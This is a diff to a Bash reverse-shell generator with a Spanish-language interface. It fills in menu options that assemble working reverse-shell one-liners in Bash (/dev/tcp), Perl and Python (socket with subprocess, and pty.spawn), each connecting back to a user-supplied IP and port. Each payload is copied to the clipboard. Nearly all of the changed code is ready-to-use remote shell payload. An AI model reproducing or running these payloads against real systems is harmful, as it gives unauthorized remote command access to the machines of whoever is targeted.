@@ -99,8 +99,7 @@ function bashm(){
         echo -e "${red}[${yellow}x${end}${red}]${end}${blue} Back${end} ${red}[<]${end}"
         read opc
         case $opc in
-        #1)
-        #2)
+        1) echo -en "bash -i >& /dev/tcp/$aipi/$portk 0>&1" | xclip -sel clip | echo -e "\nCopied To Clipboard";sleep 1.2; clear;bashm;;  
         x) menu; bk=1;;
         *) echo -e "${red}[!] Selecciona una opcion valida [!]\n"; sleep 1.2; clear; bashm
         esac
@@ -121,8 +120,7 @@ function perlm(){
         echo -e "${red}[${yellow}x${end}${red}]${end}${blue} Back${end} ${red}[<]${end}"
         read opc
         case $opc in
-        #1)
-        #2)
+        1) echo -e "perl -e 'use Socket;"'$i'"""=""\"$aipi\""";"'$p'"=$portk;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in("'$p'",inet_aton("'$i'")))){open(STDIN,"'>&S'");open(STDOUT,"'>&S'");open(STDERR,"'>&S'");exec("'/bin/sh -i'");};'" | xclip -sel clip | echo -e "\nCopied To Clipboard";sleep 1.2; clear; perlm;;
         x) menu; bk=1;;
         *) echo -e "${red}[!] Selecciona una opcion valida [!]\n"; sleep 1.2; clear; perlm
         esac
@@ -144,8 +142,8 @@ function pym(){
         echo -e "${red}[${yellow}x${end}${red}]${end}${blue} Back${end} ${red}[<]${end}"
         read opc
         case $opc in
-        #1)
-        #2)
+        1) echo -e "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$aipi\",$portk));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\""/bin/sh\"""",\"-i\"]);'" | xclip -sel clip | echo -e "\nCopied To Clipboard";sleep 1.2; clear; pym;;
+        2) echo -e "python -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$aipi\",$portk));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'" | xclip -sel clip | echo -e "\nCopied To Clipboard";sleep 1.2; clear; pym;;
         x) menu; bk=1;;
         *) echo -e "${red}[!] Selecciona una opcion valida [!]\n"; sleep 1.2; clear; pym
         esac
@@ -342,7 +340,7 @@ function dependencies(){
     tput civis
     clear; dependencias=(xclip)
     echo -e "\n${green}[${red}!${green}] ${yellow}Verificando dependencias en el sistema...${end}"
-    sleep 1.5;
+    sleep 1
     for program in "${dependencias[@]}";do
         echo -ne "\n${green}[${yellow}>${green}]${end} ${yellow}Herramienta: ${end}${green} $program${green} [${yellow}<${green}]${end}" 
         test -f /usr/bin/$program
